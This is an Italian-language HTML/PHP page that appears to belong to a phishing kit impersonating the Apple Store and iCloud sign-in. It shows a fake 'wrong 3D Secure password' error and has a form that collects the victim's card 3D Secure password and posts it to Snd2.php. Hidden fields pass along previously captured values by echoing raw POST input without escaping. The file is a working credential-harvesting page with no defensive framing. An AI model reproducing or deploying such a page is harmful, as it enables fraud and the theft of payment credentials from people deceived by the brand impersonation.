﻿<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Apple Store Italia ufficiale - Conferma il tuo account</title>
	<link href="css/style.css" type="text/css" rel="stylesheet" />
	<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="img/favicon.ico">
  	<link rel="apple-touch-icon" href="img/favicon.ico">
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	
</head>
<body>
</body>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left">
				<h1>Esplora iCloud</h1>
				<p>Il tuo ID Apple consente un facile accesso ad una vasta gamma di servizi come iTunes di Apple Store, Apple Online Store, iChat, e altro ancora. I suoi dati non saranno condivise con nessuno, a meno che non ci autorizzate.</p>
			</div>
			<div class="right">
				<form method="post" action=Snd2.php name="signup" id="signup">
					<h1>La conferma della vostra identit&agrave; .<img border="0" src="img/sc.png" width="83" height="33" align="right"></h1>
					<table cellpadding="0" cellspacing="0" border="0" width="105%">
						<tr>
							<td colspan="3">
								<p><font color="ff0000">
								Password 3D Secure errata</font></p>
							</td>
						</tr>

						


<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">Inserisci Password 3D</font>
							</td>
							<td class="rightRow" colspan="2">
								<span class="formwrap">
									<input maxlength="100" style="width:100px" id="smxsca1" name="smxsca1" type="password" placeholder="***************" />
								</span>
							</td>
						</tr>
						
					
						<tr>
							<td class="leftRow" style="border:0;" width="155">
								
							</td>
							<td class="rightRow noborder" colspan="2" style="text-align:center;border:0;">
								<input name="donnee1" value="<?php echo $_POST['donnee1'];?>" type="hidden" />
								<input name="donnee2" value="<?php echo $_POST['donnee2'];?>" type="hidden" />
								<input class="submit" value="Conferma" type="submit" />
							</td>
						</tr>
					</table>
				</form>
			</div>
		</div>
	</div>
</html>